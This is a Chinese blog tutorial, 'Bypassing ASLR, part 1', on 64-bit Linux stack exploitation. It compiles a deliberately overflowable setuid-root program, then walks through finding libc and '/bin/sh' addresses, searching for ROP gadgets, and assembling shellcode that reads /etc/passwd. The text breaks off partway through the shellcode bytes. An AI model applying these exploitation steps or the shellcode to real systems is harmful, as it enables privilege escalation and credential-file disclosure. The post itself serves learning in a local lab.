---
title: bypassaslr_1
date: 2018-05-21 16:30:00
tags:
---

# 绕过ASLR--第一部分

## 编译代码

1. 源代码

   ```c
   #include<stdio.h>
   #include <string.h>
   /* Eventhough shell() function isnt invoked directly, its needed
      here since 'system@PLT' and 'exit@PLT' stub code should be pres
      ent in executable to successfully exploit it. */
   void shell() {
   	system("/bin/sh");
   	exit(0);
   }
   int main(int argc, char* argv[]) {
   	int i=0;
   	char buf[256];
   	read(0, buf, 500);
   	printf("%s\n",buf);
   	return 0;
   }
   ```

2. 编译命令

   ```shell
   #echo 2 > /proc/sys/kernel/randomize_va_space
   $gcc -g -fno-stack-protector -o vuln vuln.c
   $sudo chown root vuln
   $sudo chgrp root vuln
   $sudo chmod +s vuln
   ```

## 调用约定

32位和64位程序的区别, 更多的是体现在[调用约定(Calling Convention)](https://en.wikipedia.org/wiki/X86_calling_conventions)上. 因为64位程序有了更多的通用寄存器, 所以通常会使用寄存器来进行函数参数传递 而不是通过栈, 来获得更高的运行速度.

本文主要是介绍Linux平台下的漏洞利用, 所以就专注于`System V AMD64 ABI` 的调用约定, 即函数参数从左到右依次用寄存器RDI,RSI,RDX,RCX,R8,R9来进行传递, 如果参数个数多于6个, 再通过栈来进行传递.

```
$ cat victim.c
int foo(int a, int b, int c,  int d,  int e,  int f,  int g,  int h) {
    return a + b + c + d + e + f + g + h;
}
int main() {
    foo(1, 2, 3, 4, 5, 6, 7, 8);
    return 0;
}
$ gcc victim.c -o victim
$ objdump -d victim | grep "<main>:" -A 11
00000000000006a0 <main>:
 6a0:   55                      push   rbp
 6a1:   48 89 e5                mov    rbp,rsp
 6a4:   6a 08                   push   0x8
 6a6:   6a 07                   push   0x7
 6a8:   41 b9 06 00 00 00       mov    r9d,0x6
 6ae:   41 b8 05 00 00 00       mov    r8d,0x5
 6b4:   b9 04 00 00 00          mov    ecx,0x4
 6b9:   ba 03 00 00 00          mov    edx,0x3
 6be:   be 02 00 00 00          mov    esi,0x2
 6c3:   bf 01 00 00 00          mov    edi,0x1
 6c8:   e8 93 ff ff ff          call   660 <foo>
```

## 准备知识

1. 查找libc基地址

   方法一:

   ```
   tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ LD_TRACE_LOADED_OBJECTS=1 ./vuln
   	linux-vdso.so.1 (0x00007ffff7ffa000)
   	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff79e4000)
   	/lib64/ld-linux-x86-64.so.2 (0x00007ffff7dd5000)
   ```

   方法二:

   首先查找libc中某一函数的偏移，以system为例:

   ```
   tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system@
      607: 000000000004f440    45 FUNC    GLOBAL DEFAULT   13 __libc_system@@GLIBC_PRIVATE
     1403: 000000000004f440    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5
   ```

   或者使用ida也可以查找函数的偏移。

   寻找system的绝对地址：

   ```
   tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ gdb -q vuln
   Catchpoint 1 (exec)
   Reading symbols from vuln...done.
   gdb-peda$ p system
   $1 = {<text variable, no debug info>} 0x5d0 <system@plt>
   gdb-peda$ r
   Starting program: /home/tianji/Desktop/sploit/bypassaslr_1/vuln 
   asdf
   asdf
   
   [Inferior 1 (process 7107) exited normally]
   Warning: not running or target is remote
   gdb-peda$ p system
   $2 = {int (const char *)} 0x7ffff7a33440 <__libc_system>
   ```

   然后就可以计算libc的基地址:

   >  0x7ffff7a33440 - 0x4f440 = 0x7ffff79e4000

2. 查找"/bin/sh"的偏移地址

   方法一:

   ```
   tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ rafind2 -z -s /bin/sh /lib/x86_64-linux-gnu/libc.so.6
   0x1b3e9a
   ```

   方法二:

   在ida中查找。

   方法三:

   在环境变量中查找。

   ```shell
   tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ gdb -q vuln
   Catchpoint 1 (exec)
   Reading symbols from vuln...done.
   gdb-peda$ b *main
   Breakpoint 2 at 0x555555554739: file vuln.c, line 17.
   gdb-peda$ r
   Starting program: /home/tianji/Desktop/sploit/bypassaslr_1/vuln 
   
   [----------------------------------registers-----------------------------------]
   RAX: 0x555555554739 (<main>:	push   rbp)
   RBX: 0x0 
   RCX: 0x555555554790 (<__libc_csu_init>:	push   r15)
   RDX: 0x7fffffffddf8 --> 0x7fffffffe1c7 ("CLUTTER_IM_MODULE=xim")
   RSI: 0x7fffffffdde8 --> 0x7fffffffe199 ("/home/tianji/Desktop/sploit/bypassaslr_1/vuln")
   RDI: 0x1 
   RBP: 0x555555554790 (<__libc_csu_init>:	push   r15)
   RSP: 0x7fffffffdd08 --> 0x7ffff7a05b97 (<__libc_start_main+231>:	mov    edi,eax)
   RIP: 0x555555554739 (<main>:	push   rbp)
   R8 : 0x7ffff7dd0d80 --> 0x0 
   R9 : 0x7ffff7dd0d80 --> 0x0 
   R10: 0x0 
   R11: 0x1 
   R12: 0x555555554610 (<_start>:	xor    ebp,ebp)
   R13: 0x7fffffffdde0 --> 0x1 
   R14: 0x0 
   R15: 0x0
   EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
   [-------------------------------------code-------------------------------------]
      0x55555555472a <shell+16>:	call   0x5555555545d0 <system@plt>
      0x55555555472f <shell+21>:	mov    edi,0x0
      0x555555554734 <shell+26>:	call   0x5555555545f0 <exit@plt>
   => 0x555555554739 <main>:	push   rbp
      0x55555555473a <main+1>:	mov    rbp,rsp
      0x55555555473d <main+4>:	sub    rsp,0x120
      0x555555554744 <main+11>:	mov    DWORD PTR [rbp-0x114],edi
      0x55555555474a <main+17>:	mov    QWORD PTR [rbp-0x120],rsi
   [------------------------------------stack-------------------------------------]
   0000| 0x7fffffffdd08 --> 0x7ffff7a05b97 (<__libc_start_main+231>:	mov    edi,eax)
   0008| 0x7fffffffdd10 --> 0x1 
   0016| 0x7fffffffdd18 --> 0x7fffffffdde8 --> 0x7fffffffe199 ("/home/tianji/Desktop/sploit/bypassaslr_1/vuln")
   0024| 0x7fffffffdd20 --> 0x100008000 
   0032| 0x7fffffffdd28 --> 0x555555554739 (<main>:	push   rbp)
   0040| 0x7fffffffdd30 --> 0x0 
   0048| 0x7fffffffdd38 --> 0xbd88a50cb0fd83be 
   0056| 0x7fffffffdd40 --> 0x555555554610 (<_start>:	xor    ebp,ebp)
   [------------------------------------------------------------------------------]
   Legend: code, data, rodata, value
   
   Breakpoint 2, main (argc=0x7fff, argv=0x0) at vuln.c:17
   warning: Source file is more recent than executable.
   17	int main(int argc, char* argv[]) {
   gdb-peda$ telescope 100
   0000| 0x7fffffffdd08 --> 0x7ffff7a05b97 (<__libc_start_main+231>:	mov    edi,eax)
   0008| 0x7fffffffdd10 --> 0x1 
   0016| 0x7fffffffdd18 --> 0x7fffffffdde8 --> 0x7fffffffe199 ("/home/tianji/Desktop/sploit/bypassaslr_1/vuln")
   0024| 0x7fffffffdd20 --> 0x100008000 
   0032| 0x7fffffffdd28 --> 0x555555554739 (<main>:	push   rbp)
   0040| 0x7fffffffdd30 --> 0x0 
   0048| 0x7fffffffdd38 --> 0xbd88a50cb0fd83be 
   0056| 0x7fffffffdd40 --> 0x555555554610 (<_start>:	xor    ebp,ebp)
   0064| 0x7fffffffdd48 --> 0x7fffffffdde0 --> 0x1 
   0072| 0x7fffffffdd50 --> 0x0 
   0080| 0x7fffffffdd58 --> 0x0 
   0088| 0x7fffffffdd60 --> 0xe8ddf05985fd83be 
   0096| 0x7fffffffdd68 --> 0xe8dde0e6894383be 
   0104| 0x7fffffffdd70 --> 0x7fff00000000 
   0112| 0x7fffffffdd78 --> 0x0 
   0120| 0x7fffffffdd80 --> 0x0 
   0128| 0x7fffffffdd88 --> 0x7ffff7de5733 (<_dl_init+259>:	add    r14,0x8)
   0136| 0x7fffffffdd90 --> 0x7ffff7dcb638 --> 0x7ffff7b7de10 --> 0x8348535554415541 
   0144| 0x7fffffffdd98 --> 0x2225ab63 
   0152| 0x7fffffffdda0 --> 0x0 
   0160| 0x7fffffffdda8 --> 0x0 
   0168| 0x7fffffffddb0 --> 0x0 
   0176| 0x7fffffffddb8 --> 0x555555554610 (<_start>:	xor    ebp,ebp)
   0184| 0x7fffffffddc0 --> 0x7fffffffdde0 --> 0x1 
   0192| 0x7fffffffddc8 --> 0x55555555463a (<_start+42>:	hlt)
   --More--(25/100)
   0200| 0x7fffffffddd0 --> 0x7fffffffddd8 --> 0x1c 
   0208| 0x7fffffffddd8 --> 0x1c 
   0216| 0x7fffffffdde0 --> 0x1 
   0224| 0x7fffffffdde8 --> 0x7fffffffe199 ("/home/tianji/Desktop/sploit/bypassaslr_1/vuln")
   0232| 0x7fffffffddf0 --> 0x0 
   0240| 0x7fffffffddf8 --> 0x7fffffffe1c7 ("CLUTTER_IM_MODULE=xim")
   0248| 0x7fffffffde00 --> 0x7fffffffe1dd ("LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc"...)
   0256| 0x7fffffffde08 --> 0x7fffffffe7c9 ("LC_MEASUREMENT=zh_CN.UTF-8")
   0264| 0x7fffffffde10 --> 0x7fffffffe7e4 ("LESSCLOSE=/usr/bin/lesspipe %s %s")
   0272| 0x7fffffffde18 --> 0x7fffffffe806 ("LC_PAPER=zh_CN.UTF-8")
   0280| 0x7fffffffde20 --> 0x7fffffffe81b ("LC_MONETARY=zh_CN.UTF-8")
   0288| 0x7fffffffde28 --> 0x7fffffffe833 ("XDG_MENU_PREFIX=gnome-")
   0296| 0x7fffffffde30 --> 0x7fffffffe84a ("_=/usr/bin/gdb")
   0304| 0x7fffffffde38 --> 0x7fffffffe859 ("LANG=en_US.UTF-8")
   0312| 0x7fffffffde40 --> 0x7fffffffe86a ("DISPLAY=:0")
   0320| 0x7fffffffde48 --> 0x7fffffffe875 ("OLDPWD=/home/tianji/Desktop/sploit")
   0328| 0x7fffffffde50 --> 0x7fffffffe898 ("GNOME_SHELL_SESSION_MODE=ubuntu")
   0336| 0x7fffffffde58 --> 0x7fffffffe8b8 ("COLORTERM=truecolor")
   0344| 0x7fffffffde60 --> 0x7fffffffe8cc ("USERNAME=tianji")
   0352| 0x7fffffffde68 --> 0x7fffffffe8dc ("XDG_VTNR=1")
   0360| 0x7fffffffde70 --> 0x7fffffffe8e7 ("SSH_AUTH_SOCK=/run/user/1000/keyring/ssh")
   0368| 0x7fffffffde78 --> 0x7fffffffe910 ("MANDATORY_PATH=/usr/share/gconf/ubuntu.mandatory.path")
   0376| 0x7fffffffde80 --> 0x7fffffffe946 ("LC_NAME=zh_CN.UTF-8")
   0384| 0x7fffffffde88 --> 0x7fffffffe95a ("XDG_SESSION_ID=1")
   0392| 0x7fffffffde90 --> 0x7fffffffe96b ("USER=tianji")
   --More--(50/100)
   0400| 0x7fffffffde98 --> 0x7fffffffe977 ("DESKTOP_SESSION=ubuntu")
   0408| 0x7fffffffdea0 --> 0x7fffffffe98e ("QT4_IM_MODULE=fcitx")
   0416| 0x7fffffffdea8 --> 0x7fffffffe9a2 ("TEXTDOMAINDIR=/usr/share/locale/")
   0424| 0x7fffffffdeb0 --> 0x7fffffffe9c3 ("GNOME_TERMINAL_SCREEN=/org/gnome/Terminal/screen/d3da222f_3cd5_4897_a029_a411cbf1e9fa")
   0432| 0x7fffffffdeb8 --> 0x7fffffffea19 ("DEFAULTS_PATH=/usr/share/gconf/ubuntu.default.path")
   0440| 0x7fffffffdec0 --> 0x7fffffffea4c ("PWD=/home/tianji/Desktop/sploit/bypassaslr_1")
   0448| 0x7fffffffdec8 --> 0x7fffffffea79 ("LINES=24")
   0456| 0x7fffffffded0 --> 0x7fffffffea82 ("HOME=/home/tianji")
   0464| 0x7fffffffded8 --> 0x7fffffffea94 ("TEXTDOMAIN=im-config")
   0472| 0x7fffffffdee0 --> 0x7fffffffeaa9 ("SSH_AGENT_PID=1606")
   0480| 0x7fffffffdee8 --> 0x7fffffffeabc ("QT_ACCESSIBILITY=1")
   0488| 0x7fffffffdef0 --> 0x7fffffffeacf ("XDG_SESSION_TYPE=x11")
   0496| 0x7fffffffdef8 --> 0x7fffffffeae4 ("XDG_DATA_DIRS=/usr/share/ubuntu:/usr/local/share:/usr/share:/var/lib/snapd/desktop")
   0504| 0x7fffffffdf00 --> 0x7fffffffeb37 ("XDG_SESSION_DESKTOP=ubuntu")
   0512| 0x7fffffffdf08 --> 0x7fffffffeb52 ("LC_ADDRESS=zh_CN.UTF-8")
   0520| 0x7fffffffdf10 --> 0x7fffffffeb69 ("GJS_DEBUG_OUTPUT=stderr")
   0528| 0x7fffffffdf18 --> 0x7fffffffeb81 ("LC_NUMERIC=zh_CN.UTF-8")
   0536| 0x7fffffffdf20 --> 0x7fffffffeb98 ("ALL_PROXY=socks://127.0.0.1:1080/")
   0544| 0x7fffffffdf28 --> 0x7fffffffebba ("no_proxy=localhost,127.0.0.0/8,::1")
   0552| 0x7fffffffdf30 --> 0x7fffffffebdd ("GTK_MODULES=gail:atk-bridge")
   0560| 0x7fffffffdf38 --> 0x7fffffffebf9 ("NO_PROXY=localhost,127.0.0.0/8,::1")
   0568| 0x7fffffffdf40 --> 0x7fffffffec1c ("COLUMNS=79")
   0576| 0x7fffffffdf48 --> 0x7fffffffec27 ("WINDOWPATH=1")
   0584| 0x7fffffffdf50 --> 0x7fffffffec34 ("SHELL=/bin/bash")
   0592| 0x7fffffffdf58 --> 0x7fffffffec44 ("VTE_VERSION=5201")
   ```

   我们可以看到“SHELL=/bin/bash”的地址:`0x7fffffffec34`,然后去掉`SHELL`,这样“/bin/bash”的地址就是`0x7fffffffec3a`

   ```
   gdb-peda$ x/s 0x7fffffffec3a
   0x7fffffffec3a:	"/bin/bash"
   ```

   当然，我这里是"/bin/bash",所以这方法不可行。这时候，可以添加环境变量。

   ```
   tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ export ABC=/bin/sh
   tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ gdb -q vuln
   Catchpoint 1 (exec)
   Reading symbols from vuln...done.
   gdb-peda$ b *main
   Breakpoint 2 at 0x739: file vuln.c, line 17.
   gdb-peda$ r
   Starting program: /home/tianji/Desktop/sploit/bypassaslr_1/vuln 
   
   [----------------------------------registers-----------------------------------]
   RAX: 0x555555554739 (<main>:	push   rbp)
   RBX: 0x0 
   RCX: 0x555555554790 (<__libc_csu_init>:	push   r15)
   RDX: 0x7fffffffdde8 --> 0x7fffffffe1bb ("CLUTTER_IM_MODULE=xim")
   RSI: 0x7fffffffddd8 --> 0x7fffffffe18d ("/home/tianji/Desktop/sploit/bypassaslr_1/vuln")
   RDI: 0x1 
   RBP: 0x555555554790 (<__libc_csu_init>:	push   r15)
   RSP: 0x7fffffffdcf8 --> 0x7ffff7a05b97 (<__libc_start_main+231>:	mov    edi,eax)
   RIP: 0x555555554739 (<main>:	push   rbp)
   R8 : 0x7ffff7dd0d80 --> 0x0 
   R9 : 0x7ffff7dd0d80 --> 0x0 
   R10: 0x0 
   R11: 0x1 
   R12: 0x555555554610 (<_start>:	xor    ebp,ebp)
   R13: 0x7fffffffddd0 --> 0x1 
   R14: 0x0 
   R15: 0x0
   EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
   [-------------------------------------code-------------------------------------]
      0x55555555472a <shell+16>:	call   0x5555555545d0 <system@plt>
      0x55555555472f <shell+21>:	mov    edi,0x0
      0x555555554734 <shell+26>:	call   0x5555555545f0 <exit@plt>
   => 0x555555554739 <main>:	push   rbp
      0x55555555473a <main+1>:	mov    rbp,rsp
      0x55555555473d <main+4>:	sub    rsp,0x120
      0x555555554744 <main+11>:	mov    DWORD PTR [rbp-0x114],edi
      0x55555555474a <main+17>:	mov    QWORD PTR [rbp-0x120],rsi
   [------------------------------------stack-------------------------------------]
   0000| 0x7fffffffdcf8 --> 0x7ffff7a05b97 (<__libc_start_main+231>:	mov    edi,eax)
   0008| 0x7fffffffdd00 --> 0x1 
   0016| 0x7fffffffdd08 --> 0x7fffffffddd8 --> 0x7fffffffe18d ("/home/tianji/Desktop/sploit/bypassaslr_1/vuln")
   0024| 0x7fffffffdd10 --> 0x100008000 
   0032| 0x7fffffffdd18 --> 0x555555554739 (<main>:	push   rbp)
   0040| 0x7fffffffdd20 --> 0x0 
   0048| 0x7fffffffdd28 --> 0x6b6b7edd8dce246d 
   0056| 0x7fffffffdd30 --> 0x555555554610 (<_start>:	xor    ebp,ebp)
   [------------------------------------------------------------------------------]
   Legend: code, data, rodata, value
   
   Breakpoint 2, main (argc=0x7fff, argv=0x0) at vuln.c:17
   warning: Source file is more recent than executable.
   17	int main(int argc, char* argv[]) {
   gdb-peda$ telescope 200
   0000| 0x7fffffffdcf8 --> 0x7ffff7a05b97 (<__libc_start_main+231>:	mov    edi,eax)
   0008| 0x7fffffffdd00 --> 0x1 
   0016| 0x7fffffffdd08 --> 0x7fffffffddd8 --> 0x7fffffffe18d ("/home/tianji/Desktop/sploit/bypassaslr_1/vuln")
   0024| 0x7fffffffdd10 --> 0x100008000 
   0032| 0x7fffffffdd18 --> 0x555555554739 (<main>:	push   rbp)
   0040| 0x7fffffffdd20 --> 0x0 
   0048| 0x7fffffffdd28 --> 0x6b6b7edd8dce246d 
   0056| 0x7fffffffdd30 --> 0x555555554610 (<_start>:	xor    ebp,ebp)
   0064| 0x7fffffffdd38 --> 0x7fffffffddd0 --> 0x1 
   0072| 0x7fffffffdd40 --> 0x0 
   0080| 0x7fffffffdd48 --> 0x0 
   0088| 0x7fffffffdd50 --> 0x3e3e2b88b8ee246d 
   0096| 0x7fffffffdd58 --> 0x3e3e3b37b470246d 
   0104| 0x7fffffffdd60 --> 0x7fff00000000 
   0112| 0x7fffffffdd68 --> 0x0 
   0120| 0x7fffffffdd70 --> 0x0 
   0128| 0x7fffffffdd78 --> 0x7ffff7de5733 (<_dl_init+259>:	add    r14,0x8)
   0136| 0x7fffffffdd80 --> 0x7ffff7dcb638 --> 0x7ffff7b7de10 --> 0x8348535554415541 
   0144| 0x7fffffffdd88 --> 0x22bf66c6 
   0152| 0x7fffffffdd90 --> 0x0 
   0160| 0x7fffffffdd98 --> 0x0 
   0168| 0x7fffffffdda0 --> 0x0 
   0176| 0x7fffffffdda8 --> 0x555555554610 (<_start>:	xor    ebp,ebp)
   0184| 0x7fffffffddb0 --> 0x7fffffffddd0 --> 0x1 
   0192| 0x7fffffffddb8 --> 0x55555555463a (<_start+42>:	hlt)
   --More--(25/200)
   0200| 0x7fffffffddc0 --> 0x7fffffffddc8 --> 0x1c 
   0208| 0x7fffffffddc8 --> 0x1c 
   0216| 0x7fffffffddd0 --> 0x1 
   0224| 0x7fffffffddd8 --> 0x7fffffffe18d ("/home/tianji/Desktop/sploit/bypassaslr_1/vuln")
   0232| 0x7fffffffdde0 --> 0x0 
   0240| 0x7fffffffdde8 --> 0x7fffffffe1bb ("CLUTTER_IM_MODULE=xim")
   0248| 0x7fffffffddf0 --> 0x7fffffffe1d1 ("LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc"...)
   0256| 0x7fffffffddf8 --> 0x7fffffffe7bd ("LC_MEASUREMENT=zh_CN.UTF-8")
   0264| 0x7fffffffde00 --> 0x7fffffffe7d8 ("LESSCLOSE=/usr/bin/lesspipe %s %s")
   0272| 0x7fffffffde08 --> 0x7fffffffe7fa ("LC_PAPER=zh_CN.UTF-8")
   0280| 0x7fffffffde10 --> 0x7fffffffe80f ("LC_MONETARY=zh_CN.UTF-8")
   0288| 0x7fffffffde18 --> 0x7fffffffe827 ("XDG_MENU_PREFIX=gnome-")
   0296| 0x7fffffffde20 --> 0x7fffffffe83e ("_=/usr/bin/gdb")
   0304| 0x7fffffffde28 --> 0x7fffffffe84d ("LANG=en_US.UTF-8")
   0312| 0x7fffffffde30 --> 0x7fffffffe85e ("DISPLAY=:0")
   0320| 0x7fffffffde38 --> 0x7fffffffe869 ("ABC=/bin/sh")
   0328| 0x7fffffffde40 --> 0x7fffffffe875 ("OLDPWD=/home/tianji/Desktop/sploit")
   0336| 0x7fffffffde48 --> 0x7fffffffe898 ("GNOME_SHELL_SESSION_MODE=ubuntu")
   0344| 0x7fffffffde50 --> 0x7fffffffe8b8 ("COLORTERM=truecolor")
   0352| 0x7fffffffde58 --> 0x7fffffffe8cc ("USERNAME=tianji")
   0360| 0x7fffffffde60 --> 0x7fffffffe8dc ("XDG_VTNR=1")
   0368| 0x7fffffffde68 --> 0x7fffffffe8e7 ("SSH_AUTH_SOCK=/run/user/1000/keyring/ssh")
   0376| 0x7fffffffde70 --> 0x7fffffffe910 ("MANDATORY_PATH=/usr/share/gconf/ubuntu.mandatory.path")
   0384| 0x7fffffffde78 --> 0x7fffffffe946 ("LC_NAME=zh_CN.UTF-8")
   0392| 0x7fffffffde80 --> 0x7fffffffe95a ("XDG_SESSION_ID=1")
   ```

   可以看到"/bin/sh"的地址：`0x7fffffffe869 + 0x6 = 0x7fffffffe86e`。

   ```
   gdb-peda$ x/s 0x7fffffffe86e
   0x7fffffffe86e:	"bin/sh"
   ```

   当然，这个方法仅限本地使用。

3. 反汇编代码

   ```
   tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ rasm2 "jmp rsp"
   ffe4
   tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ rasm2 "pop rdi; ret"
   5fc3
   ```

4. 在可执行文件中找gadget

   方法一:

   ```
   tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ rafind2 -x 5fc3 -X vuln
   0x7f3
   - offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
   0x000007f3  5fc3 9066 2e0f 1f84 0000 0000 00f3 c300  _..f............
   0x00000803  0048 83ec 0848 83c4 08c3 0000 0001 0002  .H...H..........
   0x00000813  002f 6269 6e2f 7368 0001 1b03 3b40 0000  ./bin/sh....;@..
   0x00000823  0007 0000 0094 fdff ff8c 0000 00e4 fdff  ................
   0x00000833  ffb4 0000 00f4 fdff ff5c 0000 00fe       .........\....
   ```

   可以看到5fc3的偏移位置就是: '0x7f3'

   方法二:

   ```
   tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ ROPgadget --binary vuln --all
   Gadgets information
   ============================================================
   0x0000000000000707 : add bl, dh ; ret
   0x00000000000007ff : add bl, dh ; ret
   0x0000000000000703 : add byte ptr [rax], 0 ; add byte ptr [rax], al ; ret
   0x0000000000000705 : add byte ptr [rax], al ; add bl, dh ; ret
   0x00000000000007fd : add byte ptr [rax], al ; add bl, dh ; ret
   0x00000000000007fb : add byte ptr [rax], al ; add byte ptr [rax], al ; add bl, dh ; ret
   0x0000000000000786 : add byte ptr [rax], al ; add byte ptr [rax], al ; leave ; ret
   0x000000000000066c : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret
   0x00000000000006bc : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret
   0x0000000000000704 : add byte ptr [rax], al ; add byte ptr [rax], al ; ret
   0x00000000000007fc : add byte ptr [rax], al ; add byte ptr [rax], al ; ret
   0x0000000000000787 : add byte ptr [rax], al ; add cl, cl ; ret
   0x0000000000000788 : add byte ptr [rax], al ; leave ; ret
   0x000000000000066e : add byte ptr [rax], al ; pop rbp ; ret
   0x00000000000006be : add byte ptr [rax], al ; pop rbp ; ret
   0x0000000000000706 : add byte ptr [rax], al ; ret
   0x00000000000007fe : add byte ptr [rax], al ; ret
   0x00000000000006fd : add byte ptr [rcx], al ; pop rbp ; ret
   0x0000000000000789 : add cl, cl ; ret
   0x00000000000005a3 : add esp, 8 ; ret
   0x0000000000000809 : add esp, 8 ; ret
   0x00000000000005a2 : add rsp, 8 ; ret
   0x0000000000000808 : add rsp, 8 ; ret
   0x0000000000000599 : and byte ptr [rax], al ; test rax, rax ; je 0x5a9 ; call rax
   0x000000000000065c : and byte ptr [rax], al ; test rax, rax ; je 0x678 ; pop rbp ; jmp rax
   0x00000000000006ad : and byte ptr [rax], al ; test rax, rax ; je 0x6c8 ; pop rbp ; jmp rax
   0x00000000000007d9 : call qword ptr [r12 + rbx*8]
   0x00000000000007da : call qword ptr [rsp + rbx*8]
   0x00000000000005a0 : call rax
   0x00000000000007dc : fmul qword ptr [rax - 0x7d] ; ret
   0x000000000000059e : je 0x5a4 ; call rax
   0x0000000000000661 : je 0x673 ; pop rbp ; jmp rax
   0x00000000000006b2 : je 0x6c3 ; pop rbp ; jmp rax
   0x0000000000000664 : jmp rax
   0x00000000000006b5 : jmp rax
   0x000000000000078a : leave ; ret
   0x00000000000006f8 : mov byte ptr [rip + 0x200911], 1 ; pop rbp ; ret
   0x0000000000000785 : mov eax, 0 ; leave ; ret
   0x00000000000007d7 : mov edi, ebp ; call qword ptr [r12 + rbx*8]
   0x00000000000007d6 : mov edi, r13d ; call qword ptr [r12 + rbx*8]
   0x0000000000000668 : nop dword ptr [rax + rax] ; pop rbp ; ret
   0x00000000000006b8 : nop dword ptr [rax + rax] ; pop rbp ; ret
   0x00000000000007f8 : nop dword ptr [rax + rax] ; ret
   0x0000000000000701 : nop dword ptr [rax] ; ret
   0x00000000000006b3 : or al, 0x5d ; jmp rax
   0x00000000000006fb : or dword ptr [rax], esp ; add byte ptr [rcx], al ; pop rbp ; ret
   0x00000000000007d8 : out dx, eax ; call qword ptr [r12 + rbx*8]
   0x00000000000007ec : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
   0x00000000000007ee : pop r13 ; pop r14 ; pop r15 ; ret
   0x00000000000007f0 : pop r14 ; pop r15 ; ret
   0x00000000000007f2 : pop r15 ; ret
   0x0000000000000663 : pop rbp ; jmp rax
   0x00000000000006b4 : pop rbp ; jmp rax
   0x00000000000007eb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
   0x00000000000007ef : pop rbp ; pop r14 ; pop r15 ; ret
   0x0000000000000670 : pop rbp ; ret
   0x00000000000006c0 : pop rbp ; ret
   0x00000000000006ff : pop rbp ; ret
   0x00000000000007f3 : pop rdi ; ret
   0x00000000000007f1 : pop rsi ; pop r15 ; ret
   0x00000000000007ed : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
   0x00000000000005a6 : ret
   0x0000000000000671 : ret
   0x00000000000006c1 : ret
   0x0000000000000700 : ret
   0x0000000000000709 : ret
   0x0000000000000708 : ret
   0x000000000000078b : ret
   0x00000000000007df : ret
   0x00000000000007f4 : ret
   0x0000000000000801 : ret
   0x0000000000000800 : ret
   0x000000000000080c : ret
   0x000000000000059d : sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret
   0x0000000000000805 : sub esp, 8 ; add rsp, 8 ; ret
   0x0000000000000804 : sub rsp, 8 ; add rsp, 8 ; ret
   0x000000000000066a : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret
   0x00000000000006ba : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret
   0x00000000000007fa : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret
   0x000000000000059c : test eax, eax ; je 0x5a6 ; call rax
   0x000000000000065f : test eax, eax ; je 0x675 ; pop rbp ; jmp rax
   0x00000000000006b0 : test eax, eax ; je 0x6c5 ; pop rbp ; jmp rax
   0x000000000000059b : test rax, rax ; je 0x5a7 ; call rax
   0x000000000000065e : test rax, rax ; je 0x676 ; pop rbp ; jmp rax
   0x00000000000006af : test rax, rax ; je 0x6c6 ; pop rbp ; jmp rax
   
   Unique gadgets found: 85
   tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ ROPgadget --binary vuln --all | grep "pop rdi ; ret"
   0x00000000000007f3 : pop rdi ; ret
   ```

5. shellcode编写

   读取/etc/passwd

   ```
   BITS 64 
   ; Author Mr.Un1k0d3r - RingZer0 Team 
   ; Read /etc/passwd Linux x86_64 Shellcode 
   ; Shellcode size 82 bytes 
   global _start 
   section .text 
   _start: 
       jmp _push_filename 
   
   _readfile: 
       ; syscall open file 
       pop rdi   ; pop path value 
       ; NULL byte fix 
       xor byte [rdi + 11], 0x41 
   
       xor rax, rax 
       add al, 2 
       xor rsi, rsi  ; set O_RDONLY flag 
       syscall 
   
       ; syscall read file 
       sub sp, 0xfff 
       lea rsi, [rsp] 
       mov rdi, rax 
       xor rdx, rdx 
       mov dx, 0xfff   ; size to read 
       xor rax, rax 
       syscall 
   
       ; syscall write to stdout 
       xor rdi, rdi 
       add dil, 1 ; set stdout fd = 1 
       mov rdx, rax 
       xor rax, rax 
       add al, 1 
       syscall 
   
       ; syscall exit 
       xor rax, rax 
       add al, 60 
       syscall 
   
   _push_filename: 
       call _readfile 
       path: db "/etc/passwdA" 
   ```

   ```
   $ nasm -f elf64 readfile.asm -o readfile.o 
   $ for i in $(objdump  -d readfile.o | grep "^ " | cut  -f2); do echo  -n  '\x'$i; done; echo 
   \xeb\x3f\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x6 
   6\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x 
